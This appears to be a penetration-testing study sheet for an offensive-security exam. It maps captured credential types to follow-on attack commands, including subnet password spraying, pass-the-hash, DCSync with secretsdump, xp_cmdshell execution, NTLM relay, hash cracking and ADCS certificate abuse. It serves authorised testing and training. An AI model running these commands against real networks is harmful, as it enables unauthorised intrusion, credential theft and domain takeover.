# Credential Reuse Matrix

## How to Use This Document

Found a credential? Look up its type in the table below. It tells you exactly where to test it, what to do next, and what it can escalate to. This is your "credential found → immediate action" playbook.

Every credential should be tested against the originating host's other services FIRST, then sprayed across the entire subnet.

---

## The Golden Rule of Credentials

```
FOUND A CREDENTIAL?
├── 1. Test it on the HOST IT CAME FROM (other services)
├── 2. Test it on EVERY OTHER HOST (netexec sweep)
├── 3. Crack in background (if hash)
├── 4. If domain credential → BloodHound IMMEDIATELY
└── 5. Log it — username, password, source, access level
```

---

## Credential Type Matrix

### Windows Local Password

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | SMB, WinRM, RDP on the originating host. Then SMB, WinRM, RDP on ALL hosts. |
| **Commands** | `netexec smb <subnet>/24 -u user -p pass`, `netexec winrm <subnet>/24 -u user -p pass` |
| **Follow-on attack paths** | SAM dump → Local admin hashes, LSASS dump → Domain creds, Host enumeration |
| **Escalation potential** | HIGH: Local admin → SAM/LSASS dump → Domain creds. Same password reused = admin on multiple hosts. |
| **Hash type for cracking** | NTLM (-m 1000) if you got SAM dump |
| **PTH compatible?** | YES: `psexec.py -hashes :hash`, `wmiexec.py -hashes :hash`, `evil-winrm -H` |
| **Notes** | Always check if local admin password is same as domain password (very common in exams) |

### Domain User Password

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | SMB (DC), WinRM, LDAP, Kerberos, RDP on any domain host |
| **Commands** | `netexec smb DC -u user -p pass`, `bloodhound-python -u user -p pass -d DOMAIN -ns DC`, `GetUserSPNs -request` |
| **Follow-on attack paths** | BloodHound (DA path), Kerberoast, AS-REP roast, LDAP enumeration, Password spray (same password, other users) |
| **Escalation potential** | CRITICAL: Domain user → BloodHound → ACL abuse → DA. This is the most common DA path. |
| **Hash type for cracking** | N/A (plaintext) |
| **PTH compatible?** | NO (use password directly) |
| **Notes** | IMMEDIATE: Run BloodHound. Don't do anything else until BH results are in. |

### Domain Admin Password

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | DC: SMB (psexec), WinRM (evil-winrm), RDP, LDAP |
| **Commands** | `secretsdump.py DOMAIN/Admin:pass@DC`, `psexec.py DOMAIN/Admin:pass@target` |
| **Follow-on attack paths** | DCSync → All domain hashes, Golden Ticket, Full domain control, Forest trust enumeration |
| **Escalation potential** | GAME OVER: Full domain compromise. DCSync → KRBTGT → Golden Ticket. |
| **Hash type for cracking** | N/A |
| **PTH compatible?** | YES: `secretsdump.py -hashes :hash DOMAIN/Admin@DC` |
| **Notes** | STOP everything. DCSync immediately. Then check for forest trusts. |

### SQL Credential (MSSQL sa or user)

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | MSSQL server (port 1433): `mssqlclient.py user:pass@target` |
| **Commands** | `mssqlclient.py user:pass@target`, `enable_xp_cmdshell`, `xp_cmdshell whoami` |
| **Follow-on attack paths** | xp_cmdshell → RCE → Windows shell, SQL queries → DB data extraction, Linked servers → lateral |
| **Escalation potential** | HIGH: xp_cmdshell → SYSTEM (if MSSQL runs as SYSTEM). Linked servers → other SQL servers. |
| **Hash type for cracking** | N/A |
| **PTH compatible?** | NO |
| **Notes** | If sa: enable xp_cmdshell for RCE. If regular user: extract hashes from DB user tables. |

### SSH Key (id_rsa)

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | SSH to originating host. Then SSH to other hosts with same username. |
| **Commands** | `chmod 600 id_rsa`, `ssh -i id_rsa user@host` |
| **Follow-on attack paths** | Linux privesc (on SSH host), Check domain-join, Credential harvest, Pivot setup |
| **Escalation potential** | HIGH: SSH as user → Linux privesc → root. SSH key reuse on multiple hosts. |
| **Hash type for cracking** | SSH Key passphrase: `ssh2john id_rsa > hash.txt`, `john hash.txt --wordlist=rockyou.txt` |
| **PTH compatible?** | NO |
| **Notes** | If key has passphrase: crack in background. If no passphrase: immediate access. Try key against multiple hosts. |

### NTLM Hash (from SAM/LSASS)

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | SMB, WinRM, RDP via Pass-the-Hash. Crack in background. |
| **Commands** | `psexec.py -hashes :hash user@target`, `evil-winrm -i target -u user -H hash`, `xfreerdp /v:target /u:user /pth:hash` |
| **Follow-on attack paths** | PTH → shell → SAM/LSASS dump on new host (chain). Hashcat -m 1000 (background). |
| **Escalation potential** | HIGH: Admin NTLM → full host access. Domain NTLM → AD enumeration. |
| **Hash type for cracking** | NTLM (-m 1000): crack in background with rockyou.txt + rules |
| **PTH compatible?** | YES — primary PTH credential type |
| **Notes** | PTH first, crack later. If from SAM: it's a local account. If from LSASS: likely domain account. |

### NTLMv2 Hash (Responder Capture)

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | Crack with hashcat -m 5600. Check SMB relay (if signing disabled). |
| **Commands** | `hashcat -m 5600 hash.txt rockyou.txt`, `ntlmrelayx.py -tf targets.txt -smb2support` (if relay) |
| **Follow-on attack paths** | If cracked → domain user → BloodHound. If relay → shell on target → LSASS dump. |
| **Escalation potential** | HIGH: Cracking gives domain password. Relay gives host access. Relay to ADCS gives DA. |
| **Hash type for cracking** | NetNTLMv2 (-m 5600): crack with dictionary + rules |
| **PTH compatible?** | NO (NetNTLMv2 cannot be PTH'd — must be cracked first) |
| **Notes** | Can NOT pass-the-hash with NetNTLMv2. Must crack or relay. Relay is faster if signing is disabled. |

### Kerberos TGS Ticket (Kerberoast)

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | Crack with hashcat -m 13100. Password tests service account. |
| **Commands** | `hashcat -m 13100 ticket.txt rockyou.txt`, `impacket-ticketer` (silver ticket) |
| **Follow-on attack paths** | Service account password → test SMB/WinRM on service host. Silver ticket → persistent service access. |
| **Escalation potential** | MEDIUM-HIGH: Service account → BloodHound → potential DA. Some service accounts are DA. |
| **Hash type for cracking** | Kerberos TGS (-m 13100): slower than NTLM, use dictionary + rules |
| **PTH compatible?** | NO (convert to service account password first) |
| **Notes** | Cracking is slower than NTLM. Run in background. Can forge silver tickets with known hash. |

### Kerberos TGT (AS-REP Roast)

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | Crack with hashcat -m 18200. Gives domain user credential. |
| **Commands** | `hashcat -m 18200 hash.txt rockyou.txt` |
| **Follow-on attack paths** | Domain user → BloodHound, Password spray, Test all hosts |
| **Escalation potential** | HIGH: Free domain user. BloodHound → DA path. |
| **Hash type for cracking** | Kerberos AS-REP (-m 18200): crack with dictionary + rules |
| **PTH compatible?** | NO (must crack first) |
| **Notes** | Can only get this from users without pre-authentication. Always check — it's free. |

### Machine Account Hash

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | SMB using machine account. Test local system access. |
| **Commands** | `psexec.py -hashes :hash 'DOMAIN/MACHINE$'@target` |
| **Follow-on attack paths** | Machine account can read some AD attributes. RBCD abuse. S4U2self/S4U2proxy. |
| **Escalation potential** | MEDIUM: Machine accounts can be abused for RBCD. Limited but useful in AD. |
| **Hash type for cracking** | NTLM (-m 1000): rarely cracks (random passwords) |
| **PTH compatible?** | YES: PTH with machine account for host access |
| **Notes** | Machine account hashes are usually random 120-char passwords. Won't crack. Use for RBCD/silver tickets. |

### GPP/cPassword (Groups.xml)

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | Decrypt with `gpp-decrypt`. Test password against SMB/WinRM. |
| **Commands** | `gpp-decrypt "cpassword_string"`, then `netexec smb subnet -u Administrator -p decrypted` |
| **Follow-on attack paths** | Usually local admin password. SAM dump → more creds. Domain join → AD attacks. |
| **Escalation potential** | HIGH: Local admin on domain host → LSASS → domain creds |
| **Hash type for cracking** | N/A (already encrypted with known key — decrypt directly) |
| **PTH compatible?** | NO (use decrypted password) |
| **Notes** | Microsoft published the AES key. This decrypts 100% of the time. Always check Groups.xml. |

### Certificate (PFX/PEM — from ADCS)

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | Use certificate to request TGT: `certipy auth -pfx cert.pfx -dc-ip DC -username user -domain DOMAIN` |
| **Commands** | `certipy auth -pfx cert.pfx -dc-ip DC -username ANYUSER -domain DOMAIN` |
| **Follow-on attack paths** | TGT → Domain authentication. DCSync → All hashes. |
| **Escalation potential** | GAME OVER: Certificate can authenticate as ANY user (if SAN is set in ESC1). |
| **Hash type for cracking** | PFX password: `pfx2john cert.pfx > hash.txt` |
| **PTH compatible?** | NO (use certificate for Kerberos auth) |
| **Notes** | If you got a cert from ADCS ESC1/ESC8, you can authenticate as any user including DA. Game over. |

### API Key / Token

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | The API/service the token is for. Check docs/source for endpoint. |
| **Commands** | `curl -H "Authorization: Bearer TOKEN" https://api.target.com/endpoint` |
| **Follow-on attack paths** | API access → Data extraction → PII/configs/credentials. API admin → Full service control. |
| **Escalation potential** | MEDIUM-HIGH: Depends on API privileges. Cloud tokens → cloud access → full cloud compromise. |
| **Hash type for cracking** | N/A |
| **PTH compatible?** | NO |
| **Notes** | Check what the API key can access. Test against documented API endpoints. Cloud tokens can be game over. |

### Web Application Password

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | Login to web app. Check for admin panel access. |
| **Commands** | Login via browser or curl. Post-auth enumeration: check for file upload, admin panels, RCE. |
| **Follow-on attack paths** | Web app RCE → OS shell. Config files via web app. Database credentials via app. |
| **Escalation potential** | MEDIUM: Web app admin → RCE → OS user. High if web app accesses sensitive data. |
| **Hash type for cracking** | Web app hash format varies. Try hashid/hash-identifier. |
| **PTH compatible?** | NO |
| **Notes** | If password is reused from another service → likely same user everywhere. Always check password reuse. |

### PGP/GPG Key or Symmetric Key

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | Decrypt encrypted files found on system. Decrypt backup files. |
| **Commands** | `gpg --import private.key`, `gpg --decrypt file.gpg`, `openssl enc -d -aes-256-cbc -in encrypted -out decrypted` |
| **Follow-on attack paths** | Decrypted content → passwords, configs, VPN keys, other credentials |
| **Escalation potential** | MEDIUM: Depends on what's encrypted. Could reveal DA passwords. |
| **Hash type for cracking** | GPG key passphrase: `gpg2john private.key > hash.txt` |
| **PTH compatible?** | NO |
| **Notes** | Check all encrypted files on the host. Sometimes backup files contain AD credentials. |

### SNMP Community String

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | Read host SNMP with the string: `snmpwalk -v 2c -c public target` |
| **Commands** | `snmpwalk -v 2c -c public target`, `onesixtyone target public` |
| **Follow-on attack paths** | User enumeration (UserTable), Process enumeration, Network info, Installed software |
| **Escalation potential** | MEDIUM: User enumeration → spray. Process info → running services. |
| **Hash type for cracking** | N/A |
| **PTH compatible?** | NO |
| **Notes** | SNMP read can reveal usernames, running processes, network interfaces. Write community (private) is rare but gives R/W. |

### Cloud Token (AWS/Azure/GCP)

| Attribute | Detail |
|-----------|--------|
| **Immediate validation targets** | Cloud provider API: `aws s3 ls --profile stolen`, `az login --identity` |
| **Commands** | Check cloud metadata endpoint (169.254.169.254). Test with provider CLI tools. |
| **Follow-on attack paths** | Cloud data extraction → storage buckets, databases. Cloud admin → full cloud compromise. |
| **Escalation potential** | CRITICAL if privileged: Can access cloud resources, databases, storage. |
| **Hash type for cracking** | N/A |
| **PTH compatible?** | NO |
| **Notes** | Cloud tokens from SSRF on metadata URL. If host is in cloud, ALWAYS check 169.254.169.254. |

---

## Credential Testing Priority Matrix

```
WHEN YOU FIND A CREDENTIAL, TEST IN THIS ORDER:

PRIORITY 1 — Same host (immediate):
├── SMB (445)
├── WinRM (5985/5986)
├── SSH (22)
├── RDP (3389)
├── MSSQL (1433)
└── Web app login

PRIORITY 2 — Subnet sweep (parallel):
├── netexec smb <subnet>/24 -u user -p pass
├── netexec winrm <subnet>/24 -u user -p pass
├── netexec ssh <subnet>/24 -u user -p pass
├── netexec mssql <subnet>/24 -u user -p pass
├── hydra -l user -p pass rdp://<subnet>
└── hydra -l user -p pass smtp://<subnet>

PRIORITY 3 — Domain-wide (if domain cred):
├── BloodHound enumeration
├── Kerberoasting
├── AS-REP roasting
├── LDAP enumeration
└── GPP/LAPS/ADCS checks
```

---

## Hash to Service Mapping

```
HASH FORMAT → MODE → WHERE TO USE

NTLM              (-m 1000)  → PTH: SMB, WinRM, RDP, WMI
NetNTLMv2         (-m 5600)  → Crack → password (can't PTH)
Kerberos TGS      (-m 13100) → Crack → service account password
Kerberos AS-REP   (-m 18200) → Crack → domain user password
MSSQL hash        (-m 1731)  → Crack → SQL access
MySQL hash        (-m 300)   → Crack → MySQL access
PostgreSQL hash   (-m 13000) → Crack → PostgreSQL access
SSH private key   (ssh2john) → Crack → passphrase
GPG private key   (gpg2john) → Crack → passphrase
PDF encrypted     (-m 10500) → Crack → document access
RAR/ZIP encrypted (-m 125/13000) → Crack → archive access
```

---

## Credential Found — Quick Decision Flow

```
CREDENTIAL FOUND
│
├── Is it PLAINTEXT?
│   ├── YES → Test immediately. Everywhere.
│   └── NO (hash/key/ticket)
│       ├── Can I PTH? → YES → PTH immediately
│       │                     → Crack in background
│       └── Can I relay? → YES → Relay immediately
│                           → Crack in background
│
├── Is it a DOMAIN credential?
│   ├── YES → BloodHound IMMEDIATELY
│   │        → Kerberoast
│   │        → Spray same password
│   └── NO → Test locally
│            → Check reuse
│
└── Is it a SERVICE ACCOUNT?
    ├── YES → BloodHound
    │        → Check delegation
    │        → Test service host
    └── NO → Standard user testing
```

---

## Cross-References

- Loot value tiers → [loot-priority-framework.md](./loot-priority-framework.md)
- Attack chain execution → [high-probability-paths.md](./high-probability-paths.md)
- Quick decision lookup → [exam-dashboard.md](./exam-dashboard.md)
- Pass-the-Hash/PTH techniques → [Module 12: Lateral Movement](../modules/12-lateral-pivot.md)
- Password cracking → [Module 06: Password Attacks](../modules/06-password-attacks.md)
- AD attack chains → [Module 11: Active Directory](../modules/11-active-directory.md)
- Credential harvesting → [Module 13: Post-Exploitation](../modules/13-post-exploitation.md)
